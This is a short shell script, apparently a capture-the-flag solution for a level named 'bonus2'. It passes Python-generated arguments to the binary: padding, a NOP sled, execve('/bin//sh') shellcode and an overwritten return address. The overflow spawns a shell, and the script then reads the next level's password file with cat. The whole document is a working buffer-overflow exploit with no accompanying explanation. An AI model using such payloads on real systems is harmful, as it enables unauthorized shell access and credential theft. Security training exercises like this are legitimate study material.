#!/bin/sh

########## TO BE EXECUTED ON SHELL, NO DIRECTLY IN THAT SCRIPT ###########

LANG=nl ./bonus2  $(python -c 'print "A"*40 + "\x90"*35 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"') $(python -c 'print "A"*23 + "\xbc\xf8\xff\xbf"')

cat /home/user/bonus3/.pass